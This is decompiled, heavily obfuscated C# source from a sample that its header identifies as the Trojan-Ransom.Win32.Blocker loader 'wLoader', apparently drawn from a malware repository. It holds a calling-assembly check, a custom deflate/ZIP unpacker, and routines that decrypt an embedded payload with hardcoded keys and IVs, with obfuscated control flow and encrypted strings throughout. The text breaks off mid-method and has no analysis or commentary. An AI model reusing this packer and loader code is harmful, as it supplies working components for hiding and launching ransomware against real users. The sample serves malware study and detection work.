// Decompiled with JetBrains decompiler
// Type: ?9?.?2?
// Assembly: wLoader, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 601E9F23-A239-4CA4-BCF6-5BB65F85A0DA
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.biqw-00a129d49d9d6af2a869f53ab2db7d80f4313e2b391d30ed8e02a96f59aa0cb4.exe

using \u003F16\u003F;
using \u003F2\u003F;
using System;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;

namespace \u003F9\u003F
{
  internal class \u003F2\u003F
  {
    public static string \u003F8\u003F;

    private static bool \u003F8\u003F(Assembly _param0, Assembly _param1)
    {
label_0:
      byte[] publicKey1 = _param0.GetName().GetPublicKey();
      byte[] publicKey2 = _param1.GetName().GetPublicKey();
label_8:
      int num1 = publicKey2 == null ? 1 : 0;
      if (false)
        goto label_5;
      else
        goto label_9;
label_3:
      int index;
      int num2 = (int) publicKey1[index];
      int num3;
      if (true)
      {
        if (num3 != num2)
          return false;
        if (true)
          num1 = index + 1;
        else
          goto label_8;
      }
      else
        goto label_10;
label_5:
      index = num1;
label_6:
      if (index < publicKey2.Length)
      {
        num3 = (int) publicKey2[index];
        goto label_3;
      }
label_7:
      return true;
label_9:
      num2 = publicKey1 == null ? 1 : 0;
      num3 = num1;
label_10:
      if (num3 == num2)
      {
        if (publicKey2 != null)
        {
          index = 0;
          if (false)
            goto label_0;
          else
            goto label_6;
        }
        else
          goto label_7;
      }
      else
      {
        int num4 = 0;
        if (num4 == 0)
          return num4 != 0;
        num3 = num4;
        goto label_3;
      }
    }

    public static byte[] \u003F8\u003F(byte[] _param0)
    {
      Assembly callingAssembly = Assembly.GetCallingAssembly();
      Assembly executingAssembly = Assembly.GetExecutingAssembly();
      if ((object) callingAssembly != (object) executingAssembly && !\u003F9\u003F.\u003F2\u003F.\u003F8\u003F(executingAssembly, callingAssembly))
        return (byte[]) null;
      \u003F9\u003F.\u003F2\u003F.\u003F7\u003F obj1 = new \u003F9\u003F.\u003F2\u003F.\u003F7\u003F(_param0);
      byte[] numArray1 = new byte[0];
      int num1 = obj1.\u003F1\u003F();
      int num2 = num1;
      int num3;
      int num4;
      for (int index = 67324752; num2 == index; num2 = num4)
      {
        short num5 = (short) obj1.\u003F8\u003F();
        int num6 = obj1.\u003F8\u003F();
        int num7 = obj1.\u003F8\u003F();
        if (num1 == 67324752)
        {
          num4 = (int) num5;
          int num8 = 20;
          if (num8 == 0)
          {
            index = num8;
            continue;
          }
          if (num4 == num8 && num6 == 0 && num7 == 8)
          {
            obj1.\u003F1\u003F();
            if (true)
            {
              obj1.\u003F1\u003F();
              num3 = obj1.\u003F1\u003F();
              goto label_10;
            }
            else
              goto label_28;
          }
        }
        throw new FormatException(\u003F98\u003F.\u003F99\u003F("AŧɻͽѵԱ٘ݪ\u086F३੩\u0B79ప\u0D5A\u0E61འၨᅤተ\u1376ᑰᕤ"));
      }
      goto label_16;
label_10:
      int length1 = obj1.\u003F1\u003F();
      int count1 = obj1.\u003F8\u003F();
      int count2 = obj1.\u003F8\u003F();
      if (count1 > 0)
      {
        byte[] buffer = new byte[count1];
        obj1.Read(buffer, 0, count1);
      }
label_12:
      if (count2 <= 0)
        goto label_14;
label_13:
      byte[] buffer1 = new byte[count2];
      obj1.Read(buffer1, 0, count2);
label_14:
      byte[] buffer2 = new byte[obj1.Length - obj1.Position];
      obj1.Read(buffer2, 0, buffer2.Length);
      \u003F9\u003F.\u003F2\u003F.\u003F8\u003F obj2 = new \u003F9\u003F.\u003F2\u003F.\u003F8\u003F(buffer2);
label_15:
      numArray1 = new byte[length1];
      obj2.\u003F8\u003F(numArray1, 0, numArray1.Length);
      goto label_51;
label_16:
      int num9 = num1 >> 24;
      int length2;
      int num10;
      if (true)
      {
        if (num1 - (num9 << 24) != 8223355)
          throw new FormatException(\u003F98\u003F.\u003F99\u003F("[ţɧͥѥվ٦ܧࡎॠ\u0A65୧౧\u0D73"));
        if (num9 == 1)
        {
          num3 = obj1.\u003F1\u003F();
          if (true)
          {
            length2 = num3;
            if (true)
            {
              numArray1 = new byte[length2];
              num10 = 0;
              goto label_25;
            }
            else
              goto label_12;
          }
          else
            goto label_10;
        }
        else
          goto label_26;
      }
      else
        goto label_13;
label_24:
      int length3;
      byte[] buffer3 = new byte[length3];
      obj1.Read(buffer3, 0, buffer3.Length);
      int num11;
      new \u003F9\u003F.\u003F2\u003F.\u003F8\u003F(buffer3).\u003F8\u003F(numArray1, num10, num11);
      num10 += num11;
label_25:
      if (num10 < length2)
      {
        int num12 = obj1.\u003F1\u003F();
        if (true)
        {
          num11 = obj1.\u003F1\u003F();
          length3 = num12;
          goto label_24;
        }
        else
          goto label_41;
      }
label_26:
      byte[] numArray2;
      if (num9 == 2)
        numArray2 = new byte[8]
        {
          (byte) 225,
          (byte) 20,
          (byte) 113,
          (byte) 205,
          (byte) 134,
          (byte) 94,
          (byte) 121,
          (byte) 113
        };
      else
        goto label_38;
label_28:
      byte[] numArray3 = new byte[8]
      {
        (byte) 192,
        (byte) 85,
        (byte) 153,
        (byte) 91,
        (byte) 166,
        (byte) 215,
        (byte) 109,
        (byte) 6
      };
      if (true)
      {
        using (\u003F4\u003F obj3 = new \u003F4\u003F())
        {
          using (ICryptoTransform cryptoTransform = obj3.\u003F8\u003F(numArray2, numArray3, true))
            numArray1 = \u003F9\u003F.\u003F2\u003F.\u003F8\u003F(cryptoTransform.TransformFinalBlock(_param0, 4, _param0.Length - 4));
        }
      }
      else
        goto label_15;
label_38:
      byte[] numArray4;
      byte[] numArray5;
      if (num9 == 3)
      {
        length3 = 16;
        if (length3 != 0)
        {
          byte[] numArray6 = new byte[length3];
          // ISSUE: field reference
          RuntimeHelpers.InitializeArray((Array) numArray6, __fieldref (\u003F3\u003F.\u003F8\u003F));
          numArray4 = numArray6;
          numArray5 = new byte[16]
          {
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2
          };
        }
        else
          goto label_24;
      }
      else
        goto label_51;
label_41:
      using (\u003F3\u003F obj4 = new \u003F3\u003F())
      {
        using (ICryptoTransform cryptoTransform = obj4.\u003F8\u003F(numArray4, numArray5, true))
          numArray1 = \u003F9\u003F.\u003F2\u003F.\u003F8\u003F(cryptoTransform.TransformFinalBlock(_param0, 4, _param0.Length - 4));
      }
label_51:
      obj1.Close();
      return numArray1;
    }

    public static byte[] \u003F1\u003F(byte[] _param0) => \u003F9\u003F.\u003F2\u003F.\u003F8\u003F(_param0, 1, (byte[]) null, (byte[]) null);

    public static byte[] \u003F8\u003F(byte[] _param0, byte[] _param1, byte[] _param2) => \u003F9\u003F.\u003F2\u003F.\u003F8\u003F(_param0, 2, _param1, _param2);

    public static byte[] \u003F1\u003F(byte[] _param0, byte[] _param1, byte[] _param2) => \u003F9\u003F.\u003F2\u003F.\u003F8\u003F(_param0, 3, _param1, _param2);

    private static byte[] \u003F8\u003F(
      byte[] _param0,
      int _param1,
      byte[] _param2,
      byte[] _param3)
    {
      try
      {
        \u003F9\u003F.\u003F2\u003F.\u003F7\u003F obj1 = new \u003F9\u003F.\u003F2\u003F.\u003F7\u003F();
        \u003F9\u003F.\u003F2\u003F.\u003F4\u003F obj2;
        int srcOffset;
        switch (_param1)
        {
          case 0:
            \u003F9\u003F.\u003F2\u003F.\u003F4\u003F obj3 = new \u003F9\u003F.\u003F2\u003F.\u003F4\u003F();
            if (true)
            {
              obj2 = obj3;
              goto label_57;
            }
            else
              goto label_57;
          case 1:
            if (true)
            {
              obj1.\u003F1\u003F(25000571);
              obj1.\u003F1\u003F(_param0.Length);
              srcOffset = 0;
              goto label_35;
            }
            else
              break;
          case 2:
            obj1.\u003F1\u003F(41777787);
            byte[] inputBuffer1 = \u003F9\u003F.\u003F2\u003F.\u003F8\u003F(_param0, 1, (byte[]) null, (byte[]) null);
            using (\u003F4\u003F obj4 = new \u003F4\u003F())
            {
              using (ICryptoTransform cryptoTransform = obj4.\u003F8\u003F(_param2, _param3, false))
              {
                byte[] buffer = cryptoTransform.TransformFinalBlock(inputBuffer1, 0, inputBuffer1.Length);
                obj1.Write(buffer, 0, buffer.Length);
                goto default;
              }
            }
          case 3:
            obj1.\u003F1\u003F(58555003);
            byte[] inputBuffer2 = \u003F9\u003F.\u003F2\u003F.\u003F8\u003F(_param0, 1, (byte[]) null, (byte[]) null);
            using (\u003F3\u003F obj5 = new \u003F3\u003F())
            {
              using (ICryptoTransform cryptoTransform = obj5.\u003F8\u003F(_param2, _param3, false))
              {
                byte[] buffer = cryptoTransform.TransformFinalBlock(inputBuffer2, 0, inputBuffer2.Length);
                obj1.Write(buffer, 0, buffer.Length);
                goto default;
              }
            }
          default:
label_54:
            obj1.Flush();
            obj1.Close();
            return obj1.ToArray();
        }
label_22:
        obj1.\u003F8\u003F(0);
        obj1.\u003F8\u003F(8);
        long num1;
        obj1.\u003F1\u003F((int) num1);
        uint num2;
        obj1.\u003F1\u003F((int) num2);
        long totalOut;
        obj1.\u003F1\u003F((int) totalOut);
        obj1.\u003F1\u003F(_param0.Length);
        byte[] bytes;
        obj1.\u003F8\u003F(bytes.Length);
        obj1.\u003F8\u003F(0);
        obj1.\u003F8\u003F(0);
        obj1.\u003F8\u003F(0);
        obj1.\u003F8\u003F(0);
        obj1.\u003F1\u003F(0);
        long position1;
        if (true)
        {
          obj1.\u003F1\u003F(0);
          obj1.Write(bytes, 0, bytes.Length);
          obj1.\u003F1\u003F(101010256);
          obj1.\u003F8\u003F(0);
          obj1.\u003F8\u003F(0);
          obj1.\u003F8\u003F(1);
          obj1.\u003F8\u003F(1);
          obj1.\u003F1\u003F(46 + bytes.Length);
          obj1.\u003F1\u003F((int) ((long) (30 + bytes.Length) + totalOut));
          obj1.\u003F8\u003F(0);
          obj1.Seek(position1, SeekOrigin.Begin);
          obj1.\u003F1\u003F((int) totalOut);
          goto label_54;
        }
        else
          goto label_57;
label_29:
        \u003F9\u003F.\u003F2\u003F.\u003F4\u003F obj6;
        while (!obj6.IsNeedingInput)
        {
          byte[] buffer = new byte[512];
          int count = obj6.\u003F8\u003F(buffer);
          if (count > 0)
            obj1.Write(buffer, 0, count);
          else
            break;
        }
        obj6.\u003F8\u003F();
        goto label_33;
label_31:
        byte[] buffer1 = new byte[512];
        int count1 = obj6.\u003F8\u003F(buffer1);
        if (count1 > 0)
          obj1.Write(buffer1, 0, count1);
        else
          goto label_34;
label_33:
        if (!obj6.IsFinished)
          goto label_31;
label_34:
        long position2 = obj1.Position;
        long position3;
        obj1.Position = position3;
        obj1.\u003F1\u003F((int) obj6.TotalOut);
        obj1.Position = position2;
        byte[] dst;
        srcOffset += dst.Length;
label_35:
        if (srcOffset < _param0.Length)
        {
          dst = new byte[Math.Min(2097151, _param0.Length - srcOffset)];
          Buffer.BlockCopy((Array) _param0, srcOffset, (Array) dst, 0, dst.Length);
          position3 = obj1.Position;
          obj1.\u003F1\u003F(0);
          obj1.\u003F1\u003F(dst.Length);
          obj6 = new \u003F9\u003F.\u003F2\u003F.\u003F4\u003F();
          obj6.\u003F8\u003F(dst);
          goto label_29;
        }
        else
          goto label_54;
label_57:
        DateTime now = DateTime.Now;
        int num3 = (now.Year - 1980 & (int) sbyte.MaxValue) << 25 | now.Month << 21 | now.Day << 16;
        int num4 = now.Hour << 11;
        while (true)
        {
          num1 = (long) ((uint) (num3 | num4 | now.Minute << 5) | (uint) now.Second >> 1);
          uint[] numArray = new uint[256]
          {
            0U,
            1996959894U,
            3993919788U,
            2567524794U,
            124634137U,
            1886057615U,
            3915621685U,
            2657392035U,
            249268274U,
            2044508324U,
            3772115230U,
            2547177864U,
            162941995U,
            2125561021U,
            3887607047U,
            2428444049U,
            498536548U,
            1789927666U,
            4089016648U,
            2227061214U,
            450548861U,
            1843258603U,
            4107580753U,
            2211677639U,
            325883990U,
            1684777152U,
            4251122042U,
            2321926636U,
            335633487U,
            1661365465U,
            4195302755U,
            2366115317U,
            997073096U,
            1281953886U,
            3579855332U,
            2724688242U,
            1006888145U,
            1258607687U,
            3524101629U,
            2768942443U,
            901097722U,
            1119000684U,
            3686517206U,
            2898065728U,
            853044451U,
            1172266101U,
            3705015759U,
            2882616665U,
            651767980U,
            1373503546U,
            3369554304U,
            3218104598U,
            565507253U,
            1454621731U,
            3485111705U,
            3099436303U,
            671266974U,
            1594198024U,
            3322730930U,
            2970347812U,
            795835527U,
            1483230225U,
            3244367275U,
            3060149565U,
            1994146192U,
            31158534U,
            2563907772U,
            4023717930U,
            1907459465U,
            112637215U,
            2680153253U,
            3904427059U,
            2013776290U,
            251722036U,
            2517215374U,
            3775830040U,
            2137656763U,
            141376813U,
            2439277719U,
            3865271297U,
            1802195444U,
            476864866U,
            2238001368U,
            4066508878U,
            1812370925U,
            453092731U,
            2181625025U,
            4111451223U,
            1706088902U,
            314042704U,
            2344532202U,
            4240017532U,
            1658658271U,
            366619977U,
            2362670323U,
            4224994405U,
            1303535960U,
            984961486U,
            2747007092U,
            3569037538U,
            1256170817U,
            1037604311U,
            2765210733U,
            3554079995U,
            1131014506U,
            879679996U,
            2909243462U,
            3663771856U,
            1141124467U,
            855842277U,
            2852801631U,
            3708648649U,
            1342533948U,
            654459306U,
            3188396048U,
            3373015174U,
            1466479909U,
            544179635U,
            3110523913U,
            3462522015U,
            1591671054U,
            702138776U,
            2966460450U,
            3352799412U,
            1504918807U,
            783551873U,
            3082640443U,
            3233442989U,
            3988292384U,
            2596254646U,
            62317068U,
            1957810842U,
            3939845945U,
            2647816111U,
            81470997U,
            1943803523U,
            3814918930U,
            2489596804U,
            225274430U,
            2053790376U,
            3826175755U,
            2466906013U,
            167816743U,
            2097651377U,
            4027552580U,
            2265490386U,
            503444072U,
            1762050814U,
            4150417245U,
            2154129355U,
            426522225U,
            1852507879U,
            4275313526U,
            2312317920U,
            282753626U,
            1742555852U,
            4189708143U,
            2394877945U,
            397917763U,
            1622183637U,
            3604390888U,
            2714866558U,
            953729732U,
            1340076626U,
            3518719985U,
            2797360999U,
            1068828381U,
            1219638859U,
            3624741850U,
            2936675148U,
            906185462U,
            1090812512U,
            3747672003U,
            2825379669U,
            829329135U,
            1181335161U,
            3412177804U,
            3160834842U,
            628085408U,
            1382605366U,
            3423369109U,
            3138078467U,
            570562233U,
            1426400815U,
            3317316542U,
            2998733608U,
            733239954U,
            1555261956U,
            3268935591U,
            3050360625U,
            752459403U,
            1541320221U,
            2607071920U,
            3965973030U,
            1969922972U,
            40735498U,
            2617837225U,
            3943577151U,
            1913087877U,
            83908371U,
            2512341634U,
            3803740692U,
            2075208622U,
            213261112U,
            2463272603U,
            3855990285U,
            2094854071U,
            198958881U,
            2262029012U,
            4057260610U,
            1759359992U,
            534414190U,
            2176718541U,
            4139329115U,
            1873836001U,
            414664567U,
            2282248934U,
            4279200368U,
            1711684554U,
            285281116U,
            2405801727U,
            4167216745U,
            1634467795U,
            376229701U,
            2685067896U,
            3608007406U,
            1308918612U,
            956543938U,
            2808555105U,
            3495958263U,
            1231636301U,
            1047427035U,
            2932959818U,
            3654703836U,
            1088359270U,
            936918000U,
            2847714899U,
            3736837829U,
            1202900863U,
            817233897U,
            3183342108U,
            3401237130U,
            1404277552U,
            615818150U,
            3134207493U,
            3453421203U,
            1423857449U,
            601450431U,
            3009837614U,
            3294710456U,
            1567103746U,
            711928724U,
            3020668471U,
            3272380065U,
            1510334235U,
            755167117U
          };
          uint maxValue = uint.MaxValue;
          num2 = maxValue;
          int num5 = 0;
          int num6 = _param0.Length;
          int num7;
          if (true)
            num7 = num6;
          else
            goto label_5;
label_4:
          num6 = num7;
label_5:
          if ((num7 = num6 - 1) >= 0)
          {
            num2 = numArray[(IntPtr) (uint) (((int) num2 ^ (int) _param0[num5++]) & (int) byte.MaxValue)] ^ num2 >> 8;
            goto label_4;
          }
          else
          {
            int num8 = (int) num2 ^ (int) maxValue;
            if (true)
            {
              num2 = (uint) num8;
              obj1.\u003F1\u003F(67324752);
              obj1.\u003F8\u003F(20);
              obj1.\u003F8\u003F(0);
              obj1.\u003F8\u003F(8);
              obj1.\u003F1\u003F((int) num1);
              obj1.\u003F1\u003F((int) num2);
              position1 = obj1.Position;
              obj1.\u003F1\u003F(0);
              obj1.\u003F1\u003F(_param0.Length);
              bytes = Encoding.UTF8.GetBytes(\u003F98\u003F.\u003F99\u003F("}šɥͷѣռ"));
              obj1.\u003F8\u003F(bytes.Length);
            }
            else
              goto label_11;
label_8:
            obj1.\u003F8\u003F(0);
            obj1.Write(bytes, 0, bytes.Length);
            obj2.\u003F8\u003F(_param0);
            goto label_15;
label_11:
            int count2 = num8;
            int num9 = count2;
            int num10 = 0;
            if (num10 != 0)
            {
              num4 = num10;
              num3 = num9;
              continue;
            }
            byte[] buffer2;
            if (num9 > num10)
            {
              if (true)
                obj1.Write(buffer2, 0, count2);
              else
                goto label_8;
            }
            else
              break;
label_15:
            if (!obj2.IsNeedingInput)
            {
              buffer2 = new byte[512];
              if (true)
              {
                num8 = obj2.\u003F8\u003F(buffer2);
                goto label_11;
              }
              else
                goto label_29;
            }
            else
              break;
          }
        }
        obj2.\u003F8\u003F();
        if (true)
        {
          while (!obj2.IsFinished)
          {
            byte[] buffer3 = new byte[512];
            int count3 = obj2.\u003F8\u003F(buffer3);
            if (count3 > 0)
              obj1.Write(buffer3, 0, count3);
            else
              break;
          }
        }
        totalOut = obj2.TotalOut;
        obj1.\u003F1\u003F(33639248);
        obj1.\u003F8\u003F(20);
        if (true)
        {
          obj1.\u003F8\u003F(20);
          goto label_22;
        }
        else
          goto label_31;
      }
      catch (Exception ex)
      {
        \u003F9\u003F.\u003F2\u003F.\u003F8\u003F = \u003F98\u003F.\u003F99\u003F("Ośɚ̧дԵشܰ࠸ड") + ex.Message;
        throw;
      }
    }

    internal sealed class \u003F8\u003F
    {
      private const int \u003F8\u003F = 0;
      private const int \u003F1\u003F = 1;
      private const int \u003F2\u003F = 2;
      private const int \u003F9\u003F = 3;
      private const int \u003F3\u003F = 4;
      private const int \u003F4\u003F = 5;
      private const int \u003F16\u003F = 6;
      private const int \u003F5\u003F = 7;
      private const int \u003F6\u003F = 8;
      private const int \u003F7\u003F = 9;
      private const int \u003F23\u003F = 10;
      private const int \u003F24\u003F = 11;
      private const int \u003F25\u003F = 12;
      private static readonly int[] \u003F8\u003F;
      private static readonly int[] \u003F1\u003F;
      private static readonly int[] \u003F2\u003F;
      private static readonly int[] \u003F9\u003F;
      private int \u003F26\u003F;
      private int \u003F92\u003F;
      private int \u003F94\u003F;
      private int \u003F95\u003F;
      private int \u003F96\u003F;
      private bool \u003F8\u003F;
      private \u003F9\u003F.\u003F2\u003F.\u003F1\u003F \u003F8\u003F;
      private \u003F9\u003F.\u003F2\u003F.\u003F2\u003F \u003F8\u003F;
      private \u003F9\u003F.\u003F2\u003F.\u003F3\u003F \u003F8\u003F;
      private \u003F9\u003F.\u003F2\u003F.\u003F9\u003F \u003F8\u003F;
      private \u003F9\u003F.\u003F2\u003F.\u003F9\u003F \u003F1\u003F;

      public \u003F8\u003F(byte[] _param1)
      {
        this.\u003F8\u003F = new \u003F9\u003F.\u003F2\u003F.\u003F1\u003F();
        this.\u003F8\u003F = new \u003F9\u003F.\u003F2\u003F.\u003F2\u003F();
        this.\u003F26\u003F = 2;
        this.\u003F8\u003F.\u003F8\u003F(_param1, 0, _param1.Length);
      }

      private bool \u003F8\u003F()
      {
        int num1 = this.\u003F8\u003F.\u003F8\u003F();
label_13:
        int num2 = num1;
        int num3;
        for (int index1 = 258; num2 >= index1; num2 = num3)
        {
          int num4;
          int num5;
          do
          {
            num3 = this.\u003F26\u003F;
            num5 = 7;
            if (num5 != 0)
            {
              switch (num3 - num5)
              {
                case 0:
                  do
                  {
                    if (((num4 = this.\u003F8\u003F.\u003F8\u003F(this.\u003F8\u003F)) & -256) != 0)
                      goto label_19;
label_15:
                    \u003F9\u003F.\u003F2\u003F.\u003F2\u003F obj = this.\u003F8\u003F;
                    int num6 = num4;
                    if (true)
                      goto label_16;
label_1:
                    continue;
label_16:
                    obj.\u003F8\u003F(num6);
                    goto label_1;
label_19:
                    if (num4 < 257)
                    {
                      if (false)
                        goto label_15;
                      else
                        goto label_21;
                    }
                    else
                      goto label_4;
                  }
                  while (--num1 >= 258);
                  goto label_18;
label_21:
                  if (num4 >= 0)
                  {
                    this.\u003F1\u003F = (\u003F9\u003F.\u003F2\u003F.\u003F9\u003F) null;
                    this.\u003F8\u003F = (\u003F9\u003F.\u003F2\u003F.\u003F9\u003F) null;
                    continue;
                  }
                  goto label_22;
                case 1:
                  goto label_5;
                case 2:
                  goto label_8;
                case 3:
                  goto label_10;
                default:
                  goto label_13;
              }
            }
            else
              goto label_31;
          }
          while (false);
          goto label_23;
label_4:
          this.\u003F94\u003F = \u003F9\u003F.\u003F2\u003F.\u003F8\u003F.\u003F8\u003F[num4 - 257];
          this.\u003F92\u003F = \u003F9\u003F.\u003F2\u003F.\u003F8\u003F.\u003F1\u003F[num4 - 257];
label_5:
          if (this.\u003F92\u003F > 0)
            goto label_24;
label_7:
          this.\u003F26\u003F = 9;
          goto label_8;
label_24:
          this.\u003F26\u003F = 8;
          int num7 = this.\u003F8\u003F.\u003F8\u003F(this.\u003F92\u003F);
          if (num7 < 0)
            return false;
          this.\u003F8\u003F.\u003F8\u003F(this.\u003F92\u003F);
          this.\u003F94\u003F += num7;
          goto label_7;
label_8:
          int index2 = this.\u003F1\u003F.\u003F8\u003F(this.\u003F8\u003F);
          if (index2 < 0)
            return false;
          this.\u003F95\u003F = \u003F9\u003F.\u003F2\u003F.\u003F8\u003F.\u003F2\u003F[index2];
          this.\u003F92\u003F = \u003F9\u003F.\u003F2\u003F.\u003F8\u003F.\u003F9\u003F[index2];
label_10:
          if (this.\u003F92\u003F > 0)
            goto label_27;
label_12:
          this.\u003F8\u003F.\u003F8\u003F(this.\u003F94\u003F, this.\u003F95\u003F);
          num1 -= this.\u003F94\u003F;
          this.\u003F26\u003F = 7;
          goto label_13;
label_27:
          this.\u003F26\u003F = 10;
          int num8 = this.\u003F8\u003F.\u003F8\u003F(this.\u003F92\u003F);
          if (num8 < 0)
            return false;
          this.\u003F8\u003F.\u003F8\u003F(this.\u003F92\u003F);
          this.\u003F95\u003F += num8;
          goto label_12;
label_18:
          return true;
label_22:
          return false;
label_23:
          this.\u003F26\u003F = 2;
          return true;
label_31:
          index1 = num5;
        }
        return true;
      }

      private bool \u003F1\u003F()
      {
        int num1;
        int num2;
        int num3;
        int num4;
        while (true)
        {
          int num5 = this.\u003F26\u003F;
          if (true)
          {
            int num6 = num5;
            int num7;
            while (true)
            {
              switch (num6 - 2)
              {
                case 0:
                  num7 = this.\u003F8\u003F ? 1 : 0;
                  if (false)
                  {
                    num6 = num7;
                    continue;
                  }
                  goto label_28;
                case 1:
                  goto label_8;
                case 2:
                  goto label_10;
                case 3:
                  goto label_13;
                case 4:
                  goto label_16;
                case 5:
                case 6:
                case 7:
                case 8:
                  goto label_18;
                case 10:
                  goto label_19;
                default:
                  goto label_20;
              }
            }
label_8:
            int num8 = this.\u003F96\u003F = this.\u003F8\u003F.\u003F8\u003F(16);
            int num9 = 0;
            if (num9 == 0)
            {
              if (num8 < num9)
                return false;
              this.\u003F8\u003F.\u003F8\u003F(16);
              this.\u003F26\u003F = 4;
            }
            else
            {
              num4 = num9;
              num3 = num8;
              goto label_35;
            }
label_10:
            num2 = this.\u003F8\u003F.\u003F8\u003F(16);
            goto label_11;
label_16:
            if (!this.\u003F8\u003F.\u003F8\u003F(this.\u003F8\u003F))
              return false;
            this.\u003F8\u003F = this.\u003F8\u003F.\u003F8\u003F();
            this.\u003F1\u003F = this.\u003F8\u003F.\u003F1\u003F();
            this.\u003F26\u003F = 7;
label_18:
            return this.\u003F8\u003F();
label_19:
            return false;
label_20:
            int num10 = 0;
            return num10 != 0 ? num10 != 0 : num10 != 0;
label_28:
            if (num7 != 0)
            {
              this.\u003F26\u003F = 12;
              return false;
            }
            int num11 = this.\u003F8\u003F.\u003F8\u003F(3);
            if (true)
            {
              num1 = num11;
              break;
            }
            break;
          }
        }
        goto label_27;
label_11:
        num3 = num2;
        num4 = 0;
        goto label_35;
label_13:
        this.\u003F96\u003F -= this.\u003F8\u003F.\u003F8\u003F(this.\u003F8\u003F, this.\u003F96\u003F);
        if (this.\u003F96\u003F != 0)
          return !this.\u003F8\u003F.IsNeedingInput;
        this.\u003F26\u003F = 2;
        return true;
label_27:
        if (num1 < 0)
          return false;
        do
        {
          this.\u003F8\u003F.\u003F8\u003F(3);
          if ((num1 & 1) != 0)
            goto label_30;
label_3:
          switch (num1 >> 1)
          {
            case 0:
              this.\u003F8\u003F.\u003F8\u003F();
              this.\u003F26\u003F = 3;
              goto label_7;
            case 1:
              this.\u003F8\u003F = \u003F9\u003F.\u003F2\u003F.\u003F9\u003F.\u003F8\u003F;
              this.\u003F1\u003F = \u003F9\u003F.\u003F2\u003F.\u003F9\u003F.\u003F1\u003F;
              this.\u003F26\u003F = 7;
              if (false)
                goto label_11;
              else
                goto label_7;
            case 2:
              continue;
            default:
              goto label_7;
          }
label_30:
          this.\u003F8\u003F = true;
          goto label_3;
        }
        while (false);
        goto label_32;
label_7:
        return true;
label_32:
        this.\u003F8\u003F = new \u003F9\u003F.\u003F2\u003F.\u003F3\u003F();
        this.\u003F26\u003F = 6;
        goto label_7;
label_35:
        if (num3 < num4)
          return false;
        this.\u003F8\u003F.\u003F8\u003F(16);
        this.\u003F26\u003F = 5;
        goto label_13;
      }

      public int \u003F8\u003F(byte[] _param1, int _param2, int _param3)
      {
        if (false)
          goto label_4;
        else
          goto label_11;
label_1:
        int num1;
        int num2;
        int num3;
        int num4;
        if (num3 != 0)
        {
          if (num2 != num3)
          {
            num1 = this.\u003F8\u003F.\u003F8\u003F(_param1, _param2, _param3);
            num4 = _param2;
          }
          else
            goto label_5;
        }
        else
          goto label_3;
label_2:
        num3 = num1;
        num2 = num4;
label_3:
        _param2 = num2 + num3;
label_4:
        int num5;
        num2 = num5;
        if (true)
        {
          int num6 = num1;
          num5 = num2 + num6;
          _param3 -= num1;
          if (_param3 == 0)
            return num5;
        }
        else
          goto label_6;
label_5:
        if (!this.\u003F1\u003F())
          num2 = this.\u003F8\u003F.\u003F1\u003F();
        else
          goto label_9;
label_6:
        num3 = 0;
        if (num3 == 0)
        {
          if (num2 <= num3 || this.\u003F26\u003F == 11)
            return num5;
        }
        else
          goto label_1;
label_9:
        int num7 = this.\u003F26\u003F;
        num3 = 11;
        num2 = num7;
        goto label_1;
label_11:
        int num8 = 0;
        if (num8 != 0)
        {
          num4 = num8;
          goto label_2;
        }
        else
        {
          num5 = num8;
          goto label_9;
        }
      }

      static \u003F8\u003F()
      {
label_0:
        int length1 = 29;
        while (true)
        {
          int[] numArray1 = new int[length1];
          // ISSUE: field reference
          RuntimeHelpers.InitializeArray((Array) numArray1, __fieldref (\u003F3\u003F.\u003F8\u003F));
          \u003F9\u003F.\u003F2\u003F.\u003F8\u003F.\u003F8\u003F = numArray1;
          while (true)
          {
            \u003F9\u003F.\u003F2\u003F.\u003F8\u003F.\u003F1\u003F = new int[29]
            {
              0,
              0,
              0,
              0,
              0,
              0,
              0,
              0,
              1,
              1,
              1,
              1,
              2,
              2,
              2,
              2,
              3,
              3,
              3,
              3,
              4,
              4,
              4,
              4,
              5,
              5,
              5,
              5,
              0
            };
            if (true)
            {
              \u003F9\u003F.\u003F2\u003F.\u003F8\u003F.\u003F2\u003F = new int[30]
              {
                1,
                2,
                3,
                4,
                5,
                7,
                9,
                13,
                17,
                25,
                33,
                49,
                65,
                97,
                129,
                193,
                257,
                385,
                513,
                769,
                1025,
                1537,
                2049,
                3073,
                4097,
                6145,
                8193,
                12289,
                16385,
                24577
              };
              goto label_3;
            }
          }
          goto label_4;
label_3:
          int length2 = 30;
          if (length2 == 0)
          {
            length1 = length2;
            continue;
          }
          int[] numArray2 = new int[length2];
          // ISSUE: field reference
          RuntimeHelpers.InitializeArray((Array) numArray2, __fieldref (\u003F3\u003F.\u003F8\u003F));
          \u003F9\u003F.\u003F2\u003F.\u003F8\u003F.\u003F9\u003F = numArray2;
label_4:
          if (true)
          {
            if (false)
              goto label_3;
            else
              break;
          }
          else
            goto label_0;
        }
      }
    }

    internal sealed class \u003F1\u003F
    {
      private byte[] \u003F8\u003F;
      private int \u003F8\u003F = 0;
      private int \u003F1\u003F = 0;
      private uint \u003F8\u003F = 0;
      private int \u003F2\u003F = 0;

      public int \u003F8\u003F(int _param1)
      {
        while (this.\u003F2\u003F < _param1)
        {
          if (this.\u003F8\u003F != this.\u003F1\u003F)
          {
            if (true)
            {
              \u003F9\u003F.\u003F2\u003F.\u003F1\u003F obj1 = this;
              int num1 = (int) obj1.\u003F8\u003F;
              byte[] numArray1 = this.\u003F8\u003F;
              \u003F9\u003F.\u003F2\u003F.\u003F1\u003F obj2 = this;
              int num2;
              int num3 = num2 = obj2.\u003F8\u003F;
              obj2.\u003F8\u003F = num2 + 1;
              int index1 = num3;
              int num4 = (int) numArray1[index1] & (int) byte.MaxValue;
              byte[] numArray2 = this.\u003F8\u003F;
              \u003F9\u003F.\u003F2\u003F.\u003F1\u003F obj3 = this;
              int num5;
              int num6 = num5 = obj3.\u003F8\u003F;
              obj3.\u003F8\u003F = num5 + 1;
              int index2 = num6;
              int num7 = ((int) numArray2[index2] & (int) byte.MaxValue) << 8;
